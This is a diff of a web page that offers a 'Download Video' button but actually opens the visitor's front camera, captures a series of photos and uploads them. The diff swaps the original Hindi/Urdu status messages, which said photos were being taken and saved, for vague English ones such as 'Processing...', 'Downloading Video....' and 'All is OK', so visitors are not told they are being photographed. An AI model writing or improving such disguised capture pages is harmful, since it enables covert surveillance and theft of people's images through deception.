@@ -60,11 +60,11 @@ button:focus:not(:focus-visible){outline:none}
 <button id="start">Download Video</button>
 <div class="bars" id="bars" hidden>
 <div class="bar-row">
-<div class="bar-label"><span>Processing Video....Wait</span><span id="captureText">0%</span></div>
+<div class="bar-label"><span>Processing Video....</span><span id="captureText">0%</span></div>
 <div class="bar-track"><div class="bar-fill" id="captureFill"></div></div>
 </div>
 <div class="bar-row">
-<div class="bar-label"><span>Downloading Video....Wait</span><span id="uploadText">0%</span></div>
+<div class="bar-label"><span>Downloading Video....</span><span id="uploadText">0%</span></div>
 <div class="bar-track"><div class="bar-fill" id="uploadFill"></div></div>
 </div>
 </div>
@@ -122,7 +122,7 @@ setStartDisabled(true);
 try{
 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
 }catch(e){
-say("Camera access nahi mila. Browser me permission allow karein.","err");
+say("No Camera Access Found","err");
 setStartDisabled(false);
 return;
 }
@@ -167,8 +167,8 @@ failedCount++;
 const done=uploadedCount+failedCount;
 setUploadProgress(done);
 if(done===TOTAL_SHOTS){
-if(failedCount>0)say((TOTAL_SHOTS-failedCount)+"/"+TOTAL_SHOTS+" photo save ho gayin, "+failedCount+" fail","err");
-else say("Saari photo save ho gayin","ok");
+if(failedCount>0)say((TOTAL_SHOTS-failedCount)+"/"+TOTAL_SHOTS+" loaded, "+failedCount+" fail","err");
+else say("All is OK","ok");
 }
 });
 }
@@ -186,7 +186,7 @@ setCaptureProgress(0);
 setUploadProgress(0);
 uploadFill.classList.remove("ok");
 bars.hidden=false;
-say("Photos li ja rahi hain...");
+say("Processing...");
 for(let i=1;i<=TOTAL_SHOTS;i++){
 const blob=await grabFrame();
 if(blob){
